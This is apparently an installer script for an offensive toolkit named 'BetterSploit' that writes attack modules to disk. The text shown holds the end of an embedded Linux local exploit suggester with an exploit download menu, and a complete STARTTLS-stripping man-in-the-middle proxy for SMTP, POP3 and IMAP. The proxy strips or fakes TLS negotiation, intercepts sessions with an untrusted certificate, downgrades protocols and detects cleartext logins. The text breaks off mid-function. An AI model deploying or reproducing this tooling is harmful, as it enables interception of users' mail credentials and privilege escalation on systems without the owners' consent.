            '2.6.22', '2.6.23', '2.6.24', '2.6.25', '2.6.26', '2.6.27',
            '2.6.27', '2.6.28', '2.6.29', '2.6.30', '2.6.31', '2.6.32',
            '2.6.33', '2.6.34', '2.6.35', '2.6.36', '2.6.37', '2.6.38',
            '2.6.39', '3.0.0',  '3.0.1',  '3.0.2',  '3.0.3',  '3.0.4',
            '3.0.5',  '3.0.6',  '3.1.0',  '3.2.0',  '3.3.0',  '3.4.0',
            '3.5.0',  '3.6.0',  '3.7.0',  '3.7.6',  '3.8.0',  '3.9.0',
            '3.10.0', '3.11.0', '3.12.0', '3.13.0', '3.14.0', '3.15.0',
            '3.16.0', '3.17.0', '3.18.0', '3.19.0', '4.0.0',  '4.1.0',
            '4.2.0',  '4.3.0',  '4.4.0',  '4.5.0',  '4.6.0',  '4.7.0'
        ],
        cve => '2018-14665',
        mil => 'http://www.exploit-db.com/exploits/45697',
    },
  );
}

__END__
=head1 NAME
linux_exploit_suggester-2.pl - A local exploit suggester for linux
=head1 DESCRIPTION
This perl script will enumerate the possible exploits available for a given kernel version
=head1 USAGE
[-h] Help (this message)
[-k] Kernel number (eg. 2.6.28)
[-d] Open exploit download menu
You can also provide a partial kernel version (eg. 2.4)
to see all exploits available.
=head1 AUTHOR
Jonathan Donas (c) 2019
=head1 CHANGELOG
27-03-2019 added exploit download menu
31-12-2018 added exploit_x
30-11-2018 added get_rekt
15-04-2018 added clone_newuser
23-11-2017 added packet_set_ring
05-11-2017 added af_packet
28-04-2017 added dirty_cow
25-07-2016 added overlayfs and pp_key
=cut
=head1 LICENSE
 Linux Exploit Suggester 2
 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
        
 You should have received a copy of the GNU General Public License along
 with this program; if not, write to the Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
=cut
    """)
        file.close()
    except FileExistsError:
        pass


def smtplib_starttls_stripping_mitm():
    try:
        smtp = open("BetterSploit/modules/smtplib_starttls_stripping_mitm.py", "w")
        smtp.write("""
'''
                  inbound                    outbound
[inbound_peer]<------------>[listen:proxy]<------------->[outbound_peer/target]
'''
import sys
import os
import logging
import socket
import select
import ssl
import time
import re

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)-8s - %(message)s')
logger = logging.getLogger(__name__)

class SessionTerminatedException(Exception):pass
class ProtocolViolationException(Exception):pass

class TcpSockBuff(object):
    ''' Wrapped Tcp Socket with access to last sent/received data '''
    def __init__(self, sock, peer=None):
        self.socket = None
        self.socket_ssl = None
        self.recvbuf = ''
        self.sndbuf = ''
        self.peer = peer
        self._init(sock)

    def _init(self, sock):
        self.socket = sock

    def connect(self, target=None):
        target = target or self.peer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return self.socket.connect(target)

    def accept(self):
        return self.socket.accept()

    def recv(self, buflen=8*1024, *args, **kwargs):
        if self.socket_ssl:
            chunks = []
            chunk = True
            data_pending = buflen
            while chunk and data_pending:
                chunk = self.socket_ssl.read(data_pending)
                chunks.append(chunk)
                data_pending = self.socket_ssl.pending()
            self.recvbuf = ''.join(chunks)
        else:
            self.recvbuf = self.socket.recv(buflen, *args, **kwargs)
        return self.recvbuf

    def recv_blocked(self, buflen=8*1024, timeout=None, *args, **kwargs):
        force_first_loop_iteration = True
        end = time.time()+timeout if timeout else 0
        while force_first_loop_iteration or (not timeout or time.time()<end):
            # force one recv otherwise we might not even try to read if timeout is too narrow
            try:
                return self.recv(buflen=buflen, *args, **kwargs)
            except ssl.SSLWantReadError:
                pass
            force_first_loop_iteration = False

    def send(self, data, retransmit_delay=0.1):
        if self.socket_ssl:
            last_exception = None
            for _ in xrange(3):
                try:
                    self.socket_ssl.write(data)
                    last_exception = None
                    break
                except ssl.SSLWantWriteError,swwe:
                    logger.warning("TCPSockBuff: ssl.sock not yet ready, retransmit (%d) in %f seconds: %s"%(_,retransmit_delay,repr(swwe)))
                    last_exception = swwe
                time.sleep(retransmit_delay)
            if last_exception:
                raise last_exception
        else:
            self.socket.send(data)
        self.sndbuf = data

    def sendall(self, data):
        if self.socket_ssl:
            self.send(data)
        else:
            self.socket.sendall(data)
        self.sndbuf = data

    def ssl_wrap_socket(self, *args, **kwargs):
        if len(args)>=1:
            args[1] = self.socket
        if 'sock' in kwargs:
            kwargs['sock'] = self.socket
        if not args and not kwargs.get('sock'):
            kwargs['sock'] = self.socket
        self.socket_ssl = ssl.wrap_socket(*args, **kwargs)
        self.socket_ssl.setblocking(0) # nonblocking for select

    def ssl_wrap_socket_with_context(self, ctx, *args, **kwargs):
        if len(args)>=1:
            args[1] = self.socket
        if 'sock' in kwargs:
            kwargs['sock'] = self.socket
        if not args and not kwargs.get('sock'):
            kwargs['sock'] = self.socket
        self.socket_ssl = ctx.wrap_socket(*args, **kwargs)
        self.socket_ssl.setblocking(0) # nonblocking for select

class ProtocolDetect(object):
    PROTO_SMTP = 25
    PROTO_XMPP = 5222
    PROTO_IMAP = 143
    PROTO_FTP = 21
    PROTO_POP3 = 110
    PROTO_NNTP = 119
    PROTO_IRC = 6667
    PROTO_ACAP = 675
    PROTO_SSL = 443

    PORTMAP = {25:  PROTO_SMTP,
               5222:PROTO_XMPP,
               110: PROTO_POP3,
               143: PROTO_IMAP,
               21: PROTO_FTP,
               119: PROTO_NNTP,
               6667: PROTO_IRC,
               675: PROTO_ACAP
               }

    KEYWORDS = ((['ehlo', 'helo','starttls','rcpt to:','mail from:'], PROTO_SMTP),
                (['xmpp'], PROTO_XMPP),
                (['. capability'], PROTO_IMAP),
                (['auth tls'], PROTO_FTP)
                )

    def __init__(self, target=None):
        self.protocol_id = None
        self.history = []
        if target:
            self.protocol_id = self.PORTMAP.get(target[1])
            if self.protocol_id:
                logger.debug("%s - protocol detected (target port)"%repr(self))

    def __str__(self):
        return repr(self.proto_id_to_name(self.protocol_id))

    def __repr__(self):
        return "<ProtocolDetect %s protocol_id=%s len_history=%d>"%(hex(id(self)), self.proto_id_to_name(self.protocol_id), len(self.history))

    def proto_id_to_name(self, id):
        if not id:
            return id
        for p in (a for a in dir(self) if a.startswith("PROTO_")):
            if getattr(self, p)==id:
                return p   

    def detect_peek_tls(self, sock):
        if sock.socket_ssl:
            raise Exception("SSL Detection for ssl socket ..whut!")
        TLS_VERSIONS = {
            # SSL
            '\x00\x02':"SSL_2_0",
            '\x03\x00':"SSL_3_0",
            # TLS
            '\x03\x01':"TLS_1_0",
            '\x03\x02':"TLS_1_1",
            '\x03\x03':"TLS_1_2",
            '\x03\x04':"TLS_1_3",
            }
        TLS_CONTENT_TYPE_HANDSHAKE = '\x16'
        SSLv2_PREAMBLE = 0x80
        SSLv2_CONTENT_TYPE_CLIENT_HELLO ='\x01'

        peek_bytes = sock.recv(5, socket.MSG_PEEK)
        if not len(peek_bytes)==5:
            return
        # detect sslv2, sslv3, tls: one symbol is one byte;  T .. type
        #                                                    L .. length 
        #                                                    V .. version
        #               01234
        # detect sslv2  LLTVV                T=0x01 ... MessageType.client_hello; L high bit set.
        #        sslv3  TVVLL      
        #        tls    TVVLL                T=0x16 ... ContentType.Handshake
        v = None
        if ord(peek_bytes[0]) & SSLv2_PREAMBLE \
            and peek_bytes[2]==SSLv2_CONTENT_TYPE_CLIENT_HELLO \
            and peek_bytes[3:3+2] in TLS_VERSIONS.keys():
            v = TLS_VERSIONS.get(peek_bytes[3:3+2])
            logger.info("ProtocolDetect: SSL23/TLS version: %s"%v)
        elif peek_bytes[0] == TLS_CONTENT_TYPE_HANDSHAKE \
            and peek_bytes[1:1+2] in TLS_VERSIONS.keys():
            v = TLS_VERSIONS.get(peek_bytes[1:1+2])  
            logger.info("ProtocolDetect: TLS version: %s"%v)
        return v


    def detect(self, data):
        if self.protocol_id:
            return self.protocol_id
        self.history.append(data)
        for keywordlist,proto in self.KEYWORDS:
            if any(k in data.lower() for k in keywordlist):
                self.protocol_id = proto
                logger.debug("%s - protocol detected (protocol messages)"%repr(self))
                return

class Session(object):
    ''' Proxy session from client <-> proxy <-> server 
        @param inbound: inbound socket
        @param outbound: outbound socket
        @param target: target tuple ('ip',port) 
        @param buffer_size: socket buff size'''

    def __init__(self, proxy, inbound=None, outbound=None, target=None, buffer_size=4096):
        self.proxy = proxy
        self.bind = proxy.getsockname()
        self.inbound = TcpSockBuff(inbound)
        self.outbound = TcpSockBuff(outbound, peer=target)
        self.buffer_size = buffer_size
        self.protocol = ProtocolDetect(target=target)
        self.datastore = {}

    def __repr__(self):
        return "<Session %s [client: %s] --> [prxy: %s] --> [target: %s]>"%(hex(id(self)),
                                                                            self.inbound.peer,
                                                                            self.bind,
                                                                            self.outbound.peer)
    def __str__(self):
        return "<Session %s>"%hex(id(self))

    def connect(self, target):
        self.outbound.peer = target
        logger.info("%s connecting to target %s"%(self, repr(target)))
        return self.outbound.connect(target)

    def accept(self):
        sock, addr = self.proxy.accept()
        self.inbound = TcpSockBuff(sock)
        self.inbound.peer = addr
        logger.info("%s client %s has connected"%(self,repr(self.inbound.peer)))
        return sock,addr

    def get_peer_sockets(self):
        return [self.inbound.socket, self.outbound.socket]

    def notify_read(self, sock):
        if sock == self.proxy:
            self.accept()
            self.connect(self.outbound.peer)
        elif sock == self.inbound.socket:
            # new client -> prxy - data
            self.on_recv_peek(self.inbound, self)
            self.on_recv(self.inbound, self.outbound, self)
        elif sock == self.outbound.socket:
            # new sprxy <- target - data
            self.on_recv(self.outbound, self.inbound, self)
        return 

    def close(self):
        try:
            self.outbound.socket.shutdown(2)
            self.outbound.socket.close()
            self.inbound.socket.shutdown(2)
            self.inbound.socket.close()
        except socket.error, se:
            logger.warning("session.close(): Exception: %s"%repr(se))
        raise SessionTerminatedException()

    def on_recv(self, s_in, s_out, session):
        data = s_in.recv(session.buffer_size)
        self.protocol.detect(data)
        if not len(data):
            return session.close()
        if s_in == session.inbound:
            data = self.mangle_client_data(session, data)
        elif s_in == session.outbound:
            data = self.mangle_server_data(session, data)
        if data:
            s_out.sendall(data)
        return data

    def on_recv_peek(self, s_in, session): pass
    def mangle_client_data(self, session, data, rewrite): return data
    def mangle_server_data(self, session, data, rewrite): return data

class ProxyServer(object):
    '''Proxy Class'''

    def __init__(self, listen, target, buffer_size=4096, delay=0.0001):
        self.input_list = set([])
        self.sessions = {}  # sock:Session()
        self.callbacks = {} # name: [f,..]
        #
        self.listen = listen
        self.target = target
        #
        self.buffer_size = buffer_size
        self.delay = delay
        self.bind = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bind.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.bind.bind(listen)
        self.bind.listen(200)

    def __str__(self):
        return "<Proxy %s listen=%s target=%s>"%(hex(id(self)),self.listen, self.target)

    def get_session_by_client_sock(self, sock):
        return self.sessions.get(sock)

    def set_callback(self, name, f):
        self.callbacks[name] = f

    def main_loop(self):
        self.input_list.add(self.bind)
        while True:
            time.sleep(self.delay)
            inputready, _, _ =  select.select(self.input_list, [], [])

            for sock in inputready:
                if not sock in self.input_list: 
                    # Check if inputready sock is still in the list of socks to read from
                    # as SessionTerminateException might remove multiple sockets from that list
                    # this might otherwise lead to bad FD access exceptions
                    continue
                session = None
                try:
                    if sock == self.bind:
                        # on_accept
                        session = Session(sock, target=self.target)
                        for k,v in self.callbacks.iteritems():
                            setattr(session, k, v)
                        session.notify_read(sock)
                        for s in session.get_peer_sockets():
                            self.sessions[s]=session
                        self.input_list.update(session.get_peer_sockets())
                    else:
                        # on_recv
                        try:
                            session = self.get_session_by_client_sock(sock)
                            session.notify_read(sock)
                        except ssl.SSLError, se:
                            if se.errno != ssl.SSL_ERROR_WANT_READ:
                                raise
                            continue
                        except SessionTerminatedException:
                            self.input_list.difference_update(session.get_peer_sockets())
                            logger.warning("%s terminated."%session)
                except Exception, e:
                    logger.error("main: %s"%repr(e))
                    if isinstance(e,IOError):
                        for kname,value in ((a,getattr(Vectors,a)) for a in dir(Vectors) if a.startswith("_TLS_")):
                            if not os.path.isfile(value):
                                logger.error("%s = %s - file not found"%(kname, repr(value)))
                    if session:
                        logger.error("main: removing all sockets associated with session that raised exception: %s"%repr(session))
                        try:
                            session.close()
                        except SessionTerminatedException: pass
                        self.input_list.difference_update(session.get_peer_sockets())
                    elif sock and sock!=self.bind:
                        # exception for non-bind socket - probably fine to close and remove it from our list
                        logger.error("main: removing socket that probably raised the exception")
                        sock.close()
                        self.input_list.remove(sock)
                    else:
                        # this is just super-fatal - something happened while processing our bind socket.
                        raise        

class Vectors:
    _TLS_CERTFILE = "server.pem"
    _TLS_KEYFILE = "server.pem"

    class GENERIC:
        _PROTO_ID = None
        class Intercept:
            '''
            proto independent msg_peek based tls interception
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite): return data
            @staticmethod
            def mangle_client_data(session, data, rewrite): return data
            @staticmethod
            def on_recv_peek(session, s_in):
                if s_in.socket_ssl:
                    return

                ssl_version = session.protocol.detect_peek_tls(s_in)
                if ssl_version:
                    logger.info("SSL Handshake detected - performing ssl/tls conversion")
                    try:
                        context = Vectors.GENERIC.Intercept.create_ssl_context()
                        context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                                keyfile=Vectors._TLS_KEYFILE)
                        session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                        logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                        session.outbound.ssl_wrap_socket_with_context(context, server_side=False)
                        logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
                    except Exception, e:
                        logger.warning("Exception - not ssl intercepting outbound: %s"%repr(e))

            @staticmethod
            def create_ssl_context(proto=ssl.PROTOCOL_SSLv23, 
                                   verify_mode=ssl.CERT_NONE,
                                   protocols=None,
                                   options=None,
                                   ciphers="ALL"):
                protocols = protocols or ('PROTOCOL_SSLv3','PROTOCOL_TLSv1',
                                          'PROTOCOL_TLSv1_1','PROTOCOL_TLSv1_2')
                options = options or ('OP_CIPHER_SERVER_PREFERENCE','OP_SINGLE_DH_USE',
                                      'OP_SINGLE_ECDH_USE','OP_NO_COMPRESSION')
                context = ssl.SSLContext(proto)
                context.verify_mode = verify_mode
                # reset protocol, options
                context.protocol = 0
                context.options = 0
                for p in protocols:
                    context.protocol |= getattr(ssl, p, 0)
                for o in options:
                    context.options |= getattr(ssl, o, 0)
                context.set_ciphers(ciphers)
                return context

        class InboundIntercept:
            '''
            proto independent msg_peek based tls interception
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                # peek again - make sure to check for inbound ssl connections
                #  before forwarding data to the inbound channel
                # just in case server is faster with answer than client with hello
                #  likely if smtpd and striptls are running on the same segment
                #  and client is not.
                if not session.inbound.socket_ssl:
                    # only peek if inbound is not in tls mode yet
                    # kind of a hack but allow additional 0.1 secs for the client
                    #  to send its hello
                    time.sleep(0.1)
                    Vectors.GENERIC.InterceptInbound.on_recv_peek(session, session.inbound)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite): 
                return data
            @staticmethod
            def on_recv_peek(session, s_in):
                if s_in.socket_ssl:
                    return

                ssl_version = session.protocol.detect_peek_tls(s_in)
                if ssl_version:
                    logger.info("SSL Handshake detected - performing ssl/tls conversion")
                    try:
                        context = Vectors.GENERIC.Intercept.create_ssl_context()
                        context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                                keyfile=Vectors._TLS_KEYFILE)
                        session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                        logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    except Exception, e:
                        logger.warning("Exception - not ssl intercepting inbound: %s"%repr(e))

    class SMTP:
        _PROTO_ID = 25
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
                    features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
                    if not features[-1].startswith("250 "):
                        features[-1] = features[-1].replace("250-","250 ")  # end marker
                    data = '\r\n'.join(features)+'\r\n' 
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class StripWithInvalidResponseCode:
            ''' 1) Force Server response to contain STARTTLS even though it does not support it (just because we can)
                2) Respond to client STARTTLS with invalid response code
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
                    features = list(data.strip().split("\r\n"))
                    features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
                    #if "STARTTLS" in data:
                    #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
                    data = '\r\n'.join(features)+'\r\n' 
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("200 STRIPTLS\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class StripWithTemporaryError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("454 TLS not available due to temporary reason\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("454 TLS not available due to temporary reason\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("501 Syntax error\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("501 Syntax error\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("220 Go ahead\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("220 Go ahead\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))

                    # outbound ssl
                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if "220" not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()    
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class InboundStarttlsProxy:
            ''' Inbound is starttls, outbound is plain
                1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                # keep track of stripped server ehlo/helo
                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data and not session.datastore.get("server_ehlo_stripped"): #only do this once
                    # wait for full line
                    while not "250 " in data:
                        data+=session.outbound.recv_blocked()

                    features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
                    if features and not features[-1].startswith("250 "):
                        features[-1] = features[-1].replace("250-","250 ")  # end marker
                    # force starttls announcement
                    session.datastore['server_ehlo_stripped']= '\r\n'.join(features)+'\r\n' # stripped

                    if len(features)>1:
                        features.insert(-1,"250-STARTTLS")
                    else:
                        features.append("250 STARTTLS")
                        features[0]=features[0].replace("250 ","250-")
                    data = '\r\n'.join(features)+'\r\n' # forced starttls
                    session.datastore['server_ehlo'] = data

                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("220 Go ahead\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("220 Go ahead\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # inbound ssl, fake server ehlo on helo/ehlo
                    indata = session.inbound.recv_blocked()
                    if not any(e in indata for e in ('ehlo','helo')):
                       raise ProtocolViolationException("whoop!? client did not send EHLO/HELO after STARTTLS finished.. proto violation: %s"%repr(indata))
                    logger.debug("%s [client] => [      ][mangled] %s"%(session,repr(indata)))
                    session.inbound.sendall(session.datastore["server_ehlo_stripped"])
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr(session.datastore["server_ehlo_stripped"])))
                    data=None
                elif any(e in data for e in ('ehlo','helo')) and session.datastore.get("server_ehlo_stripped"):
                    # just do not forward the second ehlo/helo
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class ProtocolDowngradeStripExtendedMode:
            ''' Return error on EHLO to force peer to non-extended mode
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.lower().startswith("ehlo "):
                    session.inbound.sendall("502 Error: command \"EHLO\" not implemented\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Error: command \"EHLO\" not implemented\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class InjectCommand:
            ''' 1) Append command to STARTTLS\r\n.
                2) untrusted intercept to check if we get an invalid command response from server
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    data += "INJECTED_INVALID_COMMAND\r\n"
                    #logger.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
                    try:
                        Vectors.SMTP.UntrustedIntercept.mangle_client_data(session, data, rewrite)
                    except ssl.SSLEOFError, se:
                        logging.info("%s - Server failed to negotiate SSL with Exception: %s"%(session, repr(se))) 
                        session.close()
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

    class POP3:
        _PROTO_ID = 110

        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STLS support
                2) raise exception if client tries to negotiated STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if data.lower().startswith('+ok capability'):
                    features = [f for f in data.strip().split('\r\n') if not "stls" in f.lower()]
                    data = '\r\n'.join(features)+'\r\n'
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.lower().startswith("stls"):
                    raise ProtocolViolationException("whoop!? client sent STLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "stls" == data.strip().lower():
                    session.inbound.sendall("-ERR unknown command\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("-ERR unknown command\r\n")))
                    data=None
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "stls"==data.strip().lower():
                    # do inbound STARTTLS
                    session.inbound.sendall("+OK Begin TLS negotiation\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("+OK Begin TLS negotiation\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_CERTFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl

                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if "+OK" not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data

    class IMAP:
        _PROTO_ID = 143
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "CAPABILITY " in data:
                    # rfc2595
                    data = data.replace(" STARTTLS","").replace(" LOGINDISABLED","")
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.strip().lower().endswith("starttls"):
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall("%s BAD unknown command\r\n"%id)
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s BAD unknown command\r\n"%id)))
                    data=None
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data

        class ProtocolDowngradeToV2:
            ''' Return IMAP2 instead of IMAP4 in initial server response
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw.lower() in data.lower() for kw in ("IMAP4","* OK ")):
                    session.inbound.sendall("OK IMAP2 Server Ready\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("OK IMAP2 Server Ready\r\n")))
                    data=None
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.strip().lower().endswith("starttls"):
                    id = data.split(' ',1)[0].strip()
                    # do inbound STARTTLS
                    session.inbound.sendall("%s OK Begin TLS negotation now\r\n"%id)
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("%s OK Begin TLS negotation now\r\n"%id)))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_CERTFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))

                    # outbound ssl

                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if "%s OK"%id not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

